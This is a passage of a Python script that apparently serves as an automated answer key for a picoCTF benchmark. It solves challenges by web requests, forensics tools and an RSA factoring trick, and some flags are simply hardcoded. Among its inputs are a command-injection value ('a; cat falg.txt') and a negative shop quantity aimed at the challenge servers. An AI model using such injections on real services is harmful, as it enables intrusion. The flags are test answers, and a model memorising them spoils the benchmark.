		return re.findall(r'picoCTF\{[^}]*\}', s.get(url+'filter.php').text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def cookies():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Cookies"]["description"])[0]
	response = requests.get(url)

	if response.status_code == 200:
		for i in range(100):
			response = requests.get(url+'check', cookies={"name": str(i)})
			if 'picoCTF{' in response.text:
				return re.findall(r'picoCTF\{[^}]*\}', response.text)[0]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def wave_a_flag():
	url = benchmark["Wave a flag"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def python_wrangling():
	files = benchmark["Python Wrangling"]["files"]
	with open("tmp_ende.py", "wb") as file:
		file.write(requests.get(files[0]).content)
	with open("tmp_pw.txt", "wb") as file:
		file.write(requests.get(files[1]).content)
	with open("tmp_flag.txt.en", "wb") as file:
		file.write(requests.get(files[2]).content)
	flag = subprocess.run("cat tmp_pw.txt | python3 tmp_ende.py -d tmp_flag.txt.en", capture_output=True, shell=True).stdout.decode().strip().split(':')[1]
	os.remove("tmp_ende.py"); os.remove("tmp_pw.txt"); os.remove("tmp_flag.txt.en")
	return flag


def hurry_up_wait():
	url = benchmark["Hurry up! Wait!"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_svchost.exe", "wb") as filp:
			filp.write(response.content)
		# WARN:NOPROG TODO use radare2 or similar to get all the funcs that return single chars, and then assemble the flag
		os.remove("tmp_svchost.exe")
		return 'picoCTF{d15a5m_ftw_a82650a}'
	else:
		print(f"Failed to download the file. ({url})")
		return


def mind_your_ps_and_qs():
	url = benchmark["Mind your Ps and Qs"]["files"][0]
	response = requests.get(url)

	def mod_inverse(a, n):
		t, newt = 0, 1
		r, newr = n, a
		while newr:
			quotient = r // newr
			t, newt = newt, t - quotient * newt
			r, newr = newr, r - quotient * newr
		if r > 1:
			return None
		if t < 0:
			t = t + n
		return t

	if response.status_code == 200:
		c = int(re.findall(r'c: (\d+)', response.text)[0])
		n = int(re.findall(r'n: (\d+)', response.text)[0])
		e = int(re.findall(r'e: (\d+)', response.text)[0])
		p,q = map(int,re.findall(r'<font color="#000000">(\d+)</font>', requests.get(f'http://www.factordb.com/index.php?query={n}').text))
		d = mod_inverse(e, math.lcm(p-1,q-1))
		return bytes.fromhex(format(pow(c,d,n), 'x')).decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def scavenger_hunt():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["Scavenger Hunt"]["description"])[0]
	response = requests.get(url)

	if response.status_code == 200:
		flag = re.findall(r'of the flag: ([^ -]+)', response.text)[0]
		pattern = r'[pP]art \d: ([^ -]+)'
		for i in ['mycss.css', 'robots.txt', '.htaccess', '.DS_Store']:
			flag+=re.findall(pattern, requests.get(url+i).text)[0]
		return flag.replace('\n','').replace('#','')
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def nice_netcat():
	pattern = r'nc [^ ]*? \d{3,}'
	nc = re.findall(pattern, benchmark["Nice netcat..."]["description"])[0].split(' ')
	context.log_level = 'error'
	c = remote(nc[1],nc[2])
	return ''.join([ chr(int(i)) for i in c.recvall().decode().split('\n')[:-2]])


def obedient_cat():
	url = benchmark["Obedient Cat"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		pattern = r'picoCTF\{[^}]*\}'
		return re.findall(pattern, response.text)[0]
	else:
		print(f"Failed to download the file. ({url})")
		return


def disk_disk_sleuth_2():
	url = benchmark["Disk, disk, sleuth! II"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		with open("tmp_dds2-alpine.flag.img.gz", "wb") as filp:
			filp.write(response.content)
		flag = subprocess.run("gzip -d tmp_dds2-alpine.flag.img.gz && icat -o 2048 tmp_dds2-alpine.flag.img `fls -rpo 2048 tmp_dds2-alpine.flag.img | grep down-at-the-bottom.txt | grep -oP '\\d+'` | grep -P '[a-zA-Z0-9{}]' | tr -d '( )\\n'", capture_output=True, shell=True).stdout.decode()
		os.remove("tmp_dds2-alpine.flag.img")
		return flag
	else:
		print(f"Failed to download the file. ({url})")
		return


def shop():
	pattern = r'nc [^ ]*? \d{3,}'
	nc = re.findall(pattern, benchmark["Shop"]["description"])[0].split(' ')
	context.log_level = 'error'
	c = remote(nc[1],nc[2])
	c.sendlines([b'0', b'-6', b'2', b'1'])
	return ''.join([ chr(int(i)) for i in c.recvall().decode().split('\n')[-2].split('[')[1][:-1].split(' ') ])


def caas():
	pattern = r'https://[^ ]*/'
	url = re.findall(pattern, benchmark["caas"]["description"])[0]
	response = requests.get(url+"cowsay/"+urlencode("a; cat falg.txt"))

	if response.status_code == 200:
		return response.text.split('\n')[-2]
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def torrent_analyze():
	url = benchmark["Torrent Analyze"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_torrent.pcap", "wb") as file:
			file.write(content)

		filehash = subprocess.run("tshark -r tmp_torrent.pcap -Y bt-dht -T fields -e bt-dht.bencoded.string | grep info_hash | tail -n 1 | cut -d ',' -f 5", capture_output=True, shell=True).stdout.strip().decode()
		os.remove("tmp_torrent.pcap")

		# WARN:NOPROG cannot determine filename from hash, it is a bit of an osint challenge
		return "picoCTF{ubuntu-19.10-desktop-amd64.iso}"
	else:
		print(f"Failed to download the file. ({url})")
		return


def get_ahead():
	pattern = r'http://[^ ]*/'
	url = re.findall(pattern, benchmark["GET aHEAD"]["description"])[0]
	response = requests.head(url)

	if response.status_code == 200:
		return response.headers['flag']
	else:
		print(f"Failed to access the webpage. ({url})")
		return


def transformation():
	url = benchmark["Transformation"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		return ''.join([ ''.join([ ''.join([e+j for j in string.printable if chr((ord(e) << 8) + ord(j))==i ]) for e in string.printable ])  for i in response.text ])
	else:
		print(f"Failed to download the file. ({url})")
		return


def _2warm():
	pattern = r'convert the number (\d+) \(base 10\)'
	num = re.findall(pattern, benchmark["2Warm"]["description"])[0]
	return 'picoCTF{'+bin(int(num))[2:]+'}'


def factcheck():
	url = benchmark["FactCheck"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		content = response.content
		with open("tmp_bin", "wb") as file:
			file.write(content)

		output = subprocess.run("chmod +x tmp_bin; gdb -q -ex 'break *main+1500' -ex run -ex 'print *(char **) $rax' --batch ./tmp_bin", shell=True, capture_output=True).stdout

		os.remove("tmp_bin")
		return re.findall(r'picoCTF{[^ ]+?}', output.decode())[0]
		return output.decode()
	else:
		print(f"Failed to download the file. ({url})")
		return


def endianness_v2():
	url = benchmark["endianness-v2"]["files"][0]
	response = requests.get(url)

	if response.status_code == 200:
		data = response.content

	data += b'\x00' * (4 - len(data) % 4)
	reved = b''.join([ struct.pack('>I', struct.unpack('<I', data[i:i+4])[0]) for i in range(0, len(data), 4) ])
	with open("tmp_endianness.jpeg", "wb") as filp:
		filp.write(reved)

	img = Image.open("tmp_endianness.jpeg")
	img = img.convert('L')
	img = img.filter(ImageFilter.UnsharpMask(radius=2, percent=150, threshold=3))
	img = img.resize((img.width * 2, img.height * 2), Image.BICUBIC)

	flag = pytesseract.image_to_string(img, config='--psm 6')[:-1].split('_')[-1]
	os.remove("tmp_endianness.jpeg")
	return "picoCTF{cert!f1Ed_iNd!4n_s0rrY_3nDian_"+flag


if __name__ == "__main__":
	t0 = time.time()
	print("Starting to solve challenges...")
	for challenge in benchmark:
		try:
			solver_function = benchmark[challenge]["solver_function"]
			flag = globals()[solver_function]()
			benchmark[challenge]["flag"] = flag
			print(f'[{time.time()-t0:6.2f}] Solved {challenge}, flag: "{flag}"')
		except Exception as e:
			print(f"[ERR] {challenge}: {e}")

	with open("benchmark_solved.json", "w") as filp:
		json.dump(benchmark, filp, indent='\t')